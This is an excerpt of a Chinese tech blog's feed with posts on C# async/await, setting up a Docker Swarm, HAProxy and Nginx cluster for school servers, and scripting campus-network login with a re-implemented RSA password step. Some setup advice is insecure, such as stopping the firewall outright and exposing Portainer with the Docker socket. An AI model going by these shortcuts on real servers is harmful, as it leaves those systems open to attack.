class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ASyncProject</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> test1 = TestData1();</span><br><span class="line">            <span class="keyword">var</span> test2 = TestData2();</span><br><span class="line">            Console.WriteLine(<span class="keyword">await</span> test2);</span><br><span class="line">            <span class="keyword">await</span> test1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">TestData1</span>(<span class="params"></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">Thread.Sleep(<span class="number">2000</span>);</span><br><span class="line">            <span class="keyword">await</span> Task.Delay(<span class="number">10000</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task&lt;<span class="built_in">string</span>&gt; <span class="title">TestData2</span>(<span class="params"></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">            <span class="keyword">await</span> Task.Delay(<span class="number">5000</span>);</span><br><span class="line">            Thread.Sleep(<span class="number">2000</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;233&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次的输出结果为</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">&lt;<span class="number">2</span> seconds later&gt;</span><br><span class="line"><span class="number">2</span></span><br><span class="line">&lt;<span class="number">7</span> seconds later&gt;</span><br><span class="line"><span class="number">233</span></span><br><span class="line">&lt;<span class="number">3</span> seconds later&gt;</span><br><span class="line">test</span><br></pre></td></tr></table></figure><p>从中我们看到，在 var test1 = TestData1(); 的时候，实际上程序是进入了 TestData1 的方法中，并逐语句地往下执行，如果是同步的语句就按照同步的方法来执行。TestData1()先执行等待 2 秒，继续执行下一句，直到。。遇到 async 函数的第一个 await</p><p>这时候就类似于开了一个新的线程，或者可以说 TestData1() 让出了他的控制权，交还给 Main()，让 Main()继续执行下一句语句，也就是 TestData2()，但是此时 TestData1() 自己还在执行，也就是说类似于分开了一个分支，TestData1()就乖乖等待着 Task.Delay(10000)完成，Main()继续跑</p><p>TestData2()也是像 TestData1()一样逐个执行下一句，直到遇到 await，TestData2()也让出了他的控制权，Main()继续执行下一行，此时 Main()也遇到 await 了</p><p>Main()就等待 test2 的结果返回，然后输出到控制台上。</p><h2 id="Wait-？"><a href="#Wait-？" class="headerlink" title=".Wait() ？"></a>.Wait() ？</h2><p>刚才试到 async 里面的 await，那么用.Wait()会怎样呢</p><p>我们仅对 TestData1()的 await 做修改，改成.Wait()看看会怎样</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task <span class="title">TestData1</span>(<span class="params"></span>)</span></span><br><span class="line">  &#123;</span><br><span class="line">      Console.WriteLine(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">      Thread.Sleep(<span class="number">2000</span>);</span><br><span class="line">      Task.Delay(<span class="number">10000</span>).Wait();</span><br><span class="line">      Console.WriteLine(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>此时结果为</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">&lt;<span class="number">12</span> seconds later&gt;</span><br><span class="line">test</span><br><span class="line">&lt;...&gt;</span><br></pre></td></tr></table></figure><p>这时候.Wait()就相当于变成同步执行的了，它并没有遇到它想要的 await，所以它还不能把控制权交给 Main()。此时虽然说 TestData1()也等待了，但 Main()也要跟着它一起等，等到出现那个 await，Main()才能跟 TestData1()分开，不然 Main()只能看着 TestData() 结束它自己。（悲）</p><h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>这就是我大概理解的 async 和 await 了，如果发现有错误请求大佬指正，果果很希望得到大家的指教 QwQ</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;C-异步编程初体验-Async-Await&quot;&gt;&lt;a href=&quot;#C-异步编程初体验-Async-Await&quot; class=&quot;headerlink&quot; title=&quot;C# 异步编程初体验(Async/Await)&quot;&gt;&lt;/a&gt;C# 异步编程初体验(Async/Await)&lt;/h1&gt;&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;之前一直没搞懂 C# 的 async 到底是怎么玩的，一直以为和 node.js 的差不多，直到昨天问了一下 Elepover，才发现一直以来理解的 async 和 await 是错误的，于是写下一篇文章记录一下自己所想，说一下自己的初步理解，有错误之处敬请大佬指正。&lt;/p&gt;</summary>
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
    <category term="CSharp" scheme="https://guo.moe/tags/CSharp/"/>
    
    <category term="Programming" scheme="https://guo.moe/tags/Programming/"/>
    
  </entry>
  
  <entry>
    <title>Docker Swarm 集群探索笔记</title>
    <link href="https://guo.moe/archives/Docker-Swarm.html"/>
    <id>https://guo.moe/archives/Docker-Swarm.html</id>
    <published>2020-02-29T06:00:00.000Z</published>
    <updated>2021-06-11T09:18:07.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学校服务器要负载均衡，根据隔壁 TARI TARI 所说，就要搞双 Nginx 冗余服务器，加上两个后端服务器用来跑 PHP 程序，同时将学校服务器的程序都跑在 Docker 上以便管理，根据 U2 推荐，使用 Swarm 进行集群搭建，一共准备六台服务器。</p><p>由于是第一次使用 Docker Swarm，操作起来并不熟练，如果文章有哪里出现错误和问题麻烦大佬们在评论区指出，谢谢 QvQ</p><p>参考资料：<a href="https://www.jianshu.com/p/df744c4e375e">https://www.jianshu.com/p/df744c4e375e</a>、<a href="https://www.jianshu.com/p/028b40ca4f2a">https://www.jianshu.com/p/028b40ca4f2a</a></p><p>注：本篇文章由 <a href="https://tari0510.github.io/">TARI TARI</a> 和 果果 共同创作</p><span id="more"></span><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>先别管那么多，只要你是 CentOS，防火墙先安排上，不然服务从外面（指 Docker 外面）是连不通的。（一个个端口关太鬼麻烦了，先把防火墙关了以便后续操作，这玩意坑了老久）</p><pre><code># 可以把防火墙关了。不过建议一个个端口关，会安全点systemctl stop firewalld</code></pre><p>如果你用 iptable 前方左转 Google</p><h2 id="准备材料"><a href="#准备材料" class="headerlink" title="准备材料"></a>准备材料</h2><ul><li>Docker_Master</li><li>CentOS7-Worker-Haproxy * 2</li><li>CentOS-Worker-Web * 2</li><li>Ubuntu-Worker-DB</li></ul><h2 id="给各台主机修改-Hostname"><a href="#给各台主机修改-Hostname" class="headerlink" title="给各台主机修改 Hostname"></a>给各台主机修改 Hostname</h2><p>为避免主机在之后的操作中难以识别的情况，先给每台主机修改 Hostname，确保主机名唯一</p><h2 id="安装-Docker"><a href="#安装-Docker" class="headerlink" title="安装 Docker"></a>安装 Docker</h2><p>参考资料：<a href="https://docs.docker.com/install/linux/docker-ce/centos/">https://docs.docker.com/install/linux/docker-ce/centos/</a></p><p>在 CentOS 的五台服务器上运行（嫌麻烦的用 Ansible）</p><pre><code>yum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-repo  https://download.docker.com/linux/centos/docker-ce.repoyum install -y docker-ce docker-ce-cli containerd.io</code></pre><p>Ubuntu 的参考这个资料 <a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/">https://docs.docker.com/install/linux/docker-ce/ubuntu/</a></p><p>来都来了，那顺便把 docker-compose 给安排了吧</p><p>参考资料：<a href="https://docs.docker.com/compose/install/">https://docs.docker.com/compose/install/</a></p><pre><code>sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.25.3/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-composesudo chmod +x /usr/local/bin/docker-composesudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose</code></pre><h2 id="对-Swarm-主机进行初始化"><a href="#对-Swarm-主机进行初始化" class="headerlink" title="对 Swarm 主机进行初始化"></a>对 Swarm 主机进行初始化</h2><p>执行命令前，给 Master 主机防火墙开启 2377（tcp）端口</p><p>给其余的节点主机和 Master 主机开启 7946（tcp &amp; udp）、4789（udp）端口</p><p>同时做作地把 80、443 端口打开以免之后出现的问题</p><p>参考资料：</p><p><a href="https://www.digitalocean.com/community/tutorials/how-to-configure-the-linux-firewall-for-docker-swarm-on-ubuntu-16-04">https://www.digitalocean.com/community/tutorials/how-to-configure-the-linux-firewall-for-docker-swarm-on-ubuntu-16-04</a></p><p><a href="https://docs.docker.com/engine/swarm/swarm-tutorial/#open-protocols-and-ports-between-the-hosts">https://docs.docker.com/engine/swarm/swarm-tutorial/#open-protocols-and-ports-between-the-hosts</a></p><pre><code>firewall-cmd --zone=public --add-port=2377/tcp --permanent # 其他节点对 Master 的访问firewall-cmd --zone=public --add-port=7946/tcp --permanent # 允许节点间的 Docker 相互通信 firewall-cmd --zone=public --add-port=7946/udp --permanentfirewall-cmd --zone=public --add-port=4789/udp --permanent # 网络交换firewall-cmd --reload# 各主机可能还需要开启的端口firewall-cmd --zone=public --add-port=80/tcp --permanentfirewall-cmd --zone=public --add-port=443/tcp --permanentfirewall-cmd --reload</code></pre><p>在 Swarm 主机上，执行命令</p><pre><code>[root@localhost ~]# docker swarm init --advertise-addr &lt;IP Address&gt; --listen-addr &lt;IP Address&gt;:&lt;Port&gt;Swarm initialized: current node (xxxxxxxxxxxxxx) is now a manager.To add a worker to this swarm, run the following command:    docker swarm join --token Balabalabalabala &lt;IP Address&gt;:&lt;Port&gt;To add a manager to this swarm, run &#39;docker swarm join-token manager&#39; and follow the instructions.</code></pre><p>然后在其他主机（节点）上运行这段命令，就是中间 docker swarm join 这行</p><h2 id="给节点贴标签"><a href="#给节点贴标签" class="headerlink" title="给节点贴标签"></a>给节点贴标签</h2><p>特定节点办特定事，给节点都贴上标签</p><pre><code>docker node update --label-add role=web Backend_1docker node update --label-add role=web Backend_2</code></pre><h2 id="部署-Portainer"><a href="#部署-Portainer" class="headerlink" title="部署 Portainer"></a>部署 Portainer</h2><p>为了方便观察和管理，这里用了 portainer</p><p>在 Master 主机上，放置 docker-compose.yml</p><pre><code>version: &quot;3&quot;services:  portainer:    container_name: &quot;portainer&quot;    image: portainer/portainer:latest    ports:        - &quot;9000:9000/tcp&quot;    volumes:        - &quot;/var/run/docker.sock:/var/run/docker.sock&quot;    environment:      TZ: &#39;Asia/Shanghai&#39;    restart: always</code></pre><p>运行 docker-compose up -d ，打开 <a href="http://xxx.xxx.xx.xxx:9000/">http://xxx.xxx.xx.xxx:9000</a> 进行配置</p><h2 id="新建一个内网使用"><a href="#新建一个内网使用" class="headerlink" title="新建一个内网使用"></a>新建一个内网使用</h2><p>docker默认网段 10.* , 然后本机如果是 10.*，则 docker 里 IP 可能会和咱内网冲突，导致无法访问到内网其他设备。 为了更方便管理，于是新建一个空闲网段</p><pre><code>docker network create -d overlay --subnet=192.168.0.0/24 --attachable WordPress</code></pre><p>之后在docker-compose.yml 里面加入改网段就好了</p><h2 id="Docker-Stack-的启动"><a href="#Docker-Stack-的启动" class="headerlink" title="Docker Stack 的启动"></a>Docker Stack 的启动</h2><p>这里用到 <a href="https://github.com/metowolf">metowolf</a>/<strong><a href="https://github.com/metowolf/docker-lemp">docker-lemp</a></strong> </p><p>放在 Master 机器上</p><p>同样，我也不知道这个是不是正确的食用方法，稍微改改</p><p>（此处 /var/www 放在 /home 是因为机器上分区就给 /home 挂了个较大容量的分区，不知道怎么想的（小声</p><p>（同时 /etc/php-fpm 就直接栽到 /etc 文件夹，避免其他人上来不知道丢哪了</p><pre><code>version: &#39;3.2&#39;services:  php-fpm:    image: metowolf/php:latest    volumes:      - /etc/php-fpm/php-fpm.ini:/usr/local/etc/php-fpm.ini      - /etc/php-fpm/crontabs:/etc/crontabs      - /home/www:/var/www    networks:      - WordPress    deploy:      mode: global      placement:         constraints:            - node.labels.role==web      restart_policy:         condition: any    environment:      ENABLE_CRONTAB: &quot;true&quot;      TZ: Asia/Shanghai  nginx:    image: metowolf/nginx:latest    volumes:      - /var/log/nginx:/var/log/nginx      - /etc/nginx/nginx.conf:/etc/nginx/nginx.conf      - /etc/nginx/conf.d:/etc/nginx/conf.d      - /etc/nginx/ssl:/etc/nginx/ssl      - /home/www:/var/www    networks:      - WordPress    deploy:      mode: global      placement:         constraints:            - node.labels.role==web      restart_policy:         condition: any    environment:      ENABLE_CRONTAB: &quot;true&quot;      TZ: Asia/Shanghai    depends_on:      - php-fpmnetworks:  WordPress:    external: true</code></pre><p>输入</p><pre><code>docker stack deploy -c docker-compose.yml Web_Backend</code></pre><p>给 role 为 web 的两个节点分配任务</p><p>注：这么分配完了以后，由于 nginx.conf 写的是请求 php-fpm:9000 ，php-fpm 此时有两个host，所以nginx会选择性地去请求这两个其中的一个</p><p>注注：这里不用分配 80 和 443 端口，nginx 和 haproxy 的沟通通过 swarm 网络，将 haproxy 和 nginx 放在同一个 swarm 网络即可</p><p>然后到此时我感觉我 swarm 的用法是不是搞错了（小声嘀咕</p><h2 id="部署Haproxy"><a href="#部署Haproxy" class="headerlink" title="部署Haproxy"></a>部署Haproxy</h2><p>在 Master 主机上，放置 docker-compose.yml</p><pre><code>version: &quot;3.0&quot;services:  haproxy:    image: haproxytech/haproxy-alpine    ports:      - 80:80      - 443:443      - 443:443/udp    dns:      - 127.0.0.11    volumes:      - /var/www:/var/www      - /etc/haproxy:/usr/local/etc/haproxy    networks:      - WordPress    deploy:      mode: global      placement:         constraints:            - node.labels.role==haproxy      restart_policy:         condition: any    environment:      ENABLE_CRONTAB: &quot;true&quot;      TZ: Asia/Shanghainetworks:  WordPress:    external: true</code></pre><p>haproxy 服务器上</p><p>注意 用证书要把两个证书合并</p><pre><code>-----BEGIN RSA PRIVATE KEY----------END RSA PRIVATE KEY----------BEGIN CERTIFICATE----------END CERTIFICATE-----</code></pre><p>可以在控制台运行 </p><pre><code>cat domain.crt domain.key | tee cert.pem</code></pre><p>合并证书。</p><pre><code>mkdir /etc/haproxytouch /etc/haproxy/haproxy.cfg# /etc/haproxy/haproxy.cfg 内容如下global    daemon    log          fd@2 local2    chroot /usr/local/etc/haproxy    tune.ssl.default-dh-param 2048</code></pre><p>​<br>​    # 此处理论上不需要，因为 Docker 默认解析的主机名就是127.0.0.11，如果实在无法解析到 nginx 就加上这段吧<br>​    ########docker 主机名解析##############<br>​    resolvers docker<br>​        nameserver dns1 127.0.0.11:53<br>​        resolve_retries 3<br>​        timeout resolve 1s<br>​        timeout retry   1s<br>​        hold other      10s<br>​        hold refused    10s<br>​        hold nx         10s<br>​        hold timeout    10s<br>​        hold valid      10s<br>​        hold obsolete   10s<br>​<br>    ########default##############<br>    defaults<br>        log global<br>        mode http<br>        option httplog<br>        option dontlognull<br>        option http-server-close<br>        option forwardfor except 127.0.0.1<br>        option redispatch<br>        retries 3<br>        option redispatch<br>        maxconn 2000<br>        timeout http-request 10s<br>        timeout queue 1m<br>        timeout connect 10s<br>        timeout client 1m<br>        timeout server 1m<br>        timeout http-keep-alive 10s<br>        timeout check 10s<br>        maxconn 3000</p><pre><code>########frontend配置##############frontend www  bind *:80  bind *:443 ssl crt /usr/local/etc/haproxy/ssl/cert.pem  #隐藏HAProxy版本信息  stats hide-version  mode http  option httpclose  option forwardfor  rspidel ^Server.*  redirect scheme https if !&#123; ssl_fc &#125;  # 利用单一连接处理多条客户端请求，从而实现性能提升  option http-server-close  default_backend web-backend########backend配置###############指定一个名为web-backend的backendbackend web-backend  mode http  balance roundrobin  cookie SERVERID insert indirect nocache  server-template nginx 3 nginx:80 check resolvers docker inter 1000docker pull haproxytech/haproxy-alpinedocker node update --label-add role=haproxy HaProxy_1docker stack deploy -c docker-compose.yml HaProxy_1</code></pre><h2 id="配置-Nginx-进行自我缓存（不建议）"><a href="#配置-Nginx-进行自我缓存（不建议）" class="headerlink" title="配置 Nginx 进行自我缓存（不建议）"></a>配置 Nginx 进行自我缓存（不建议）</h2><p>参考资料：<a href="https://juejin.im/post/5af38e0c518825670c45ef6e#heading-4">https://juejin.im/post/5af38e0c518825670c45ef6e</a> (作者：我是leon)</p><p>本来是可以用 HaProxy + Vanish 来搭建缓存服务器的，闲太麻烦就直接用 nginx 搞了（</p><p>在 nginx.conf 中添加以下设置</p><pre><code>proxy_connect_timeout 10;proxy_read_timeout 180;proxy_send_timeout 5;proxy_buffer_size 16k;proxy_buffers 4 32k;proxy_busy_buffers_size 96k;proxy_temp_file_write_size 96k;proxy_temp_path /var/www/nginx/temp;proxy_cache_path /var/www/nginx/cache levels=1:2 keys_zone=cache_one:100m inactive=1d max_size=10g;</code></pre><p>（这里为了能够外部调用删除缓存写在 PHP 和 nginx 的公共目录下</p><h2 id="部署-Syncthing"><a href="#部署-Syncthing" class="headerlink" title="部署 Syncthing"></a>部署 Syncthing</h2><p>参考文档：<a href="https://github.com/linuxserver/docker-syncthing">https://github.com/linuxserver/docker-syncthing</a></p><p>注意：此处不能按照此方法用swarm分配任务，或者你在 docker-compose 单独写两个 services 也行，并且将两个 services 分别分配到不同的端口，否则连接到 Syncthing 控制台时将会产生混乱。</p><p>原因：这里分配完端口后，会向 swarm 网络的所有节点打开端口，然后在任意节点上尝试连接该端口就会自动转发到对应的节点上。</p><p>为了让两台 Web 服务器的文件同步，同时也方便查看，这里使用 syncthing</p><p>先给所有服务器创建 /etc/syncthing 文件夹</p><p>我本来是想用 swarm 派的，结果发现创建完了以后，一台服务器的syncthing GUI总是喜欢去连接一下另一台，另一台总是喜欢去连接一下这台，瞎搞</p><p>编辑 docker-compose.yml</p><pre><code>version: &quot;3&quot;services:  syncthing:    image: linuxserver/syncthing    environment:      - PUID=1000      - PGID=1000      - TZ=Asia/Shanghai      - UMASK_SET=&lt;022&gt;    volumes:      - /etc/syncthing:/config      - /var/www:/sync/www      - /etc/php-fpm:/sync/php-fpm      - /etc/nginx:/sync/nginx    ports:      - 8384:8384      - 22000:22000      - 21027:21027/udp    restart: always</code></pre><h2 id="安装WordPress"><a href="#安装WordPress" class="headerlink" title="安装WordPress"></a>安装WordPress</h2><p>配置 nginx， 先把 原来的 https 证书搬过来，换上 </p><p>解析 网站根目录至 /var/www/wordpress</p><p>虽然物理主机上网站根目录的 /home/www 目录下， 但 docker 里的逻辑卷于 /var/www/</p><h2 id="配置-nfs"><a href="#配置-nfs" class="headerlink" title="配置 nfs"></a>配置 nfs</h2><p>此处配置 nfs 以便文件同步（？）</p><pre><code># /etc/fstab 增加server_ip:server_dir  client_dir nfs rw  0 0</code></pre><h2 id="rsync-同步"><a href="#rsync-同步" class="headerlink" title="rsync 同步"></a>rsync 同步</h2><p>（注：如果上面 Syncthing 不好用的话那还是用这个吧（</p><p>主服务器 以及 从服务器文件</p><pre><code># 详情可参考 https://tari0510.github.io/2019/07/15/ansible-shell/ rsync部分# 从服务器已经配置好， 主服务器执行以下命令即可sh /usr/local/inotify/rsync.sh &amp;</code></pre><h2 id="数据库服务器允许新ip访问"><a href="#数据库服务器允许新ip访问" class="headerlink" title="数据库服务器允许新ip访问"></a>数据库服务器允许新ip访问</h2><p>如果是通过更换 ip 的方式迁移数据库这一步就不需要了</p><h2 id="时间同步"><a href="#时间同步" class="headerlink" title="时间同步"></a>时间同步</h2><p><a href="https://blog.csdn.net/a_drjiaoda/article/details/89674468">https://blog.csdn.net/a_drjiaoda/article/details/89674468</a></p><pre><code>yum -y install ntp ntpdatentpdate 0.asia.pool.ntp.orghwclock --systohc</code></pre><p>关闭所有 debug 信息</p><p>配置好 nginx 把域名解析到新服务器ip应该问题不大了。</p><h1 id="乱七八糟的问题"><a href="#乱七八糟的问题" class="headerlink" title="乱七八糟的问题"></a>乱七八糟的问题</h1><h2 id="ailed-to-chown-socket-at-step-GROUP-No-such-process"><a href="#ailed-to-chown-socket-at-step-GROUP-No-such-process" class="headerlink" title="ailed to chown socket at step GROUP: No such process"></a>ailed to chown socket at step GROUP: No such process</h2><p>解决方法：</p><p>添加docker用户组</p><pre><code>groupadd docker# 如果出现 groupadd: cannot open /etc/group ，可能文件被加锁了，解文件锁就好了chattr -i /etc/group</code></pre><h2 id="Haproxy-dns-解析问题"><a href="#Haproxy-dns-解析问题" class="headerlink" title="Haproxy dns 解析问题"></a>Haproxy dns 解析问题</h2><p><img data-src="/images/Article/Docker-Swarm/Untitled.png" alt="Docker-Swarm/Untitled.png"></p><p>这里理论上是不应该出现的，出现这个问题先去看一下 开始 / 对 Swarm 主机进行初始化 这里是否配置正确</p><p>先进容器试试能不能 ping 通nginx，如果不能，关掉防火墙。</p><p>也有可能是 haproxy 版本问题，好像 ≤ 1.6 是没有 dns 解析功能的。</p><p>还是无法解决右转 Google</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;学校服务器要负载均衡，根据隔壁 TARI TARI 所说，就要搞双 Nginx 冗余服务器，加上两个后端服务器用来跑 PHP 程序，同时将学校服务器的程序都跑在 Docker 上以便管理，根据 U2 推荐，使用 Swarm 进行集群搭建，一共准备六台服务器。&lt;/p&gt;
&lt;p&gt;由于是第一次使用 Docker Swarm，操作起来并不熟练，如果文章有哪里出现错误和问题麻烦大佬们在评论区指出，谢谢 QvQ&lt;/p&gt;
&lt;p&gt;参考资料：&lt;a href=&quot;https://www.jianshu.com/p/df744c4e375e&quot;&gt;https://www.jianshu.com/p/df744c4e375e&lt;/a&gt;、&lt;a href=&quot;https://www.jianshu.com/p/028b40ca4f2a&quot;&gt;https://www.jianshu.com/p/028b40ca4f2a&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;注：本篇文章由 &lt;a href=&quot;https://tari0510.github.io/&quot;&gt;TARI TARI&lt;/a&gt; 和 果果 共同创作&lt;/p&gt;</summary>
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
    <category term="Docker" scheme="https://guo.moe/tags/Docker/"/>
    
    <category term="Swarm" scheme="https://guo.moe/tags/Swarm/"/>
    
  </entry>
  
  <entry>
    <title>使用 Python 登录校园网的一次探索</title>
    <link href="https://guo.moe/archives/Python-School-Network.html"/>
    <id>https://guo.moe/archives/Python-School-Network.html</id>
    <published>2020-02-09T14:00:00.000Z</published>
    <updated>2021-06-11T09:18:07.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开学那段时间刚办完校园网宽带，学校每天晚上 12 点都会定时断网，每天 6 点又会将网络开启，断网就是将同学萌从校园网强制下线，然后禁止登录，每天都要重复登陆一次，觉得有点麻烦，先试了一下校园网是否允许路由器，发现可行，于是乎想着就随手在树莓派上跑个脚本，断网就自动执行。</p><p>写这篇玩意其实是因为没啥东西好水了，随便找个以前的来水一下，顺便记录一下之前的小操作</p><span id="more"></span><h1 id="搞起"><a href="#搞起" class="headerlink" title="搞起"></a>搞起</h1><h2 id="连接到校园网时的跳转"><a href="#连接到校园网时的跳转" class="headerlink" title="连接到校园网时的跳转"></a>连接到校园网时的跳转</h2><p>首先连接到校园网会有一个奇怪的跳转，generate_204 会首先被跳转到 <a href="http://123.123.123.123/">http://123.123.123.123</a> ，接着被跳转到学校的登录界面。获取 <a href="http://123.123.123.123/">http://123.123.123.123/</a> 的网页内容，会发现跳转所需要的参数之类的乱七八糟的东西，内容大概长这样</p><pre><code>&lt;script&gt;top.self.location.href=&#39;http://x.x.x.x/eportal/index.jsp?wlanuserip=xxxx&#39;&lt;/script&gt;</code></pre><p>用来干啥的先不管，反正就知道连接到校园网时要跳转到这里</p><h2 id="登录到校园网时的加密"><a href="#登录到校园网时的加密" class="headerlink" title="登录到校园网时的加密"></a>登录到校园网时的加密</h2><p>这玩意好像不是所有学校都有，有的学校没有加密的，看情况</p><p>校园网的界面大概长这样（这个是自助服务的界面，登陆的界面不太一样，下面大概有个选择运营商）</p><p><img data-src="/images/Article/Python-School-Network/Snipaste_2020-02-09_20-09-05.png" alt="Snipaste_2020-02-09_20-09-05.png"></p><p>说实话，这个界面在开学前就有所耳闻了，好像大多数学校都会用这一种。。</p><p>输入账号密码，登录，看 post 内容，发现 password 项被加密了，name 就是用的输入框用户名的内容</p><p><img data-src="/images/Article/Python-School-Network/Snipaste_2020-02-09_20-13-21.png" alt="Snipaste_2020-02-09_20-13-21.png"></p><p>找到 password 加密所用的 js 文件 @/selfservice/common/self/js/security.js ，看开头写了几行注释</p><pre><code>/* * RSA, a suite of routines for performing RSA public-key computations in JavaScript. * Copyright 1998-2005 David Shapiro. * Dave Shapiro * dave@ohdave.com  * changed by Fuchun, 2010-05-06 * fcrpg2005@gmail.com */</code></pre><p>Google 搜索 <a href="mailto:&#102;&#99;&#x72;&#x70;&#x67;&#x32;&#x30;&#x30;&#x35;&#x40;&#103;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#109;">&#102;&#99;&#x72;&#x70;&#x67;&#x32;&#x30;&#x30;&#x35;&#x40;&#103;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#109;</a> ，发现有人做过加密的，但大多都是用 Python 来运行 js 代码获取结果。。虽然这样也可以，但总觉得哪里不优雅。</p><p>由注释可以大概得知，这玩意用的 RSA</p><p>在 Chrome 调试，发现调用过 RSAUtils.encryptedString ，于是断点调试下列代码</p><pre><code>RSAUtils.encryptedString = function(key, s) &#123;    var a = [];    var sl = s.length;    var i = 0;    while (i &lt; sl) &#123;        a[i] = s.charCodeAt(i);        i++;    &#125;    while (a.length % key.chunkSize != 0) &#123;        a[i++] = 0;    &#125;    var al = a.length;    var result = &quot;&quot;;    var j, k, block;    for (i = 0; i &lt; al; i += key.chunkSize) &#123;        block = new BigInt();        j = 0;        for (k = i; k &lt; i + key.chunkSize; ++j) &#123;            block.digits[j] = a[k++];            block.digits[j] += a[k++] &lt;&lt; 8;        &#125;        var crypt = key.barrett.powMod(block, key.e);        var text = key.radix == 16 ? RSAUtils.biToHex(crypt) : RSAUtils.biToString(crypt, key.radix);        result += text + &quot; &quot;;    &#125;    return result.substring(0, result.length - 1); // Remove last space.&#125;;</code></pre><p>大概能知道，key 就是传入的公钥， s 就是字符串，只不过我传入的时候发现 s 是被倒置的，hmm 不是很懂</p><p>就在我在疑惑这key放在了哪的时候，看到了这个 @/selfservice/module/scgroup/js/login_self.js</p><p><img data-src="/images/Article/Python-School-Network/Snipaste_2020-02-09_20-45-07.png" alt="Snipaste_2020-02-09_20-45-07.png"></p><p>emm ，然后回去翻一翻 HTML 源码</p><p><img data-src="/images/Article/Python-School-Network/Snipaste_2020-02-09_20-47-02.png" alt="Snipaste_2020-02-09_20-47-02.png"></p><p>。。。就这玩意，前面的 10001 大概就是指数了，后面的那一串就是密钥本体了</p><p>至于 RSA 加密这个果果就不是很懂，<del>于是在 U2 的专业代打和蜜汁调试下搞定了</del></p><p>看样子，就是先给这个字符串的每一个字符都转换为 int，然后</p><p>然后直接上这一段的代码吧（确信</p><pre><code>def passwordEncrypt(self, password):    m = 0x2bab3b5d45...... # 10001&amp; 后面那一串    e = 0x00010001 # 就是 &amp; 前面那一串    dec = 0    decList = list(map(ord, reversed(password)))    for i in range(len(decList)):        dec += decList[-(i) - 1] &lt;&lt; (i * 8)    return hex(dec**e%m)[2:]</code></pre><p>然后说实话我还是不知道为啥要反转（</p><p>然后后来直接 Google 了一下 selfservice 校园网，发现别人都没有加密的就我们搞那么麻烦（戳手指）</p><p>自己加密一次，和控制台的输出无差别，成了</p><h2 id="发起上网请求"><a href="#发起上网请求" class="headerlink" title="发起上网请求"></a>发起上网请求</h2><h3 id="判断联网"><a href="#判断联网" class="headerlink" title="判断联网"></a>判断联网</h3><p>那要本来就上了网的话就没必要再去请求了，于是用 genarate_204 来检测一下是否成功联网</p><pre><code>def isConnected(self):    try:        reqTmp = requests.get(&quot;http://g.cn/generate_204&quot;)    except:        return False # 在请求的时候出错直接返回错误    if reqTmp.status_code == 204:        return True    return False</code></pre><p>大概就这么判断，还是有点粗糙</p><h3 id="一个-Post-请求"><a href="#一个-Post-请求" class="headerlink" title="一个 Post 请求"></a>一个 Post 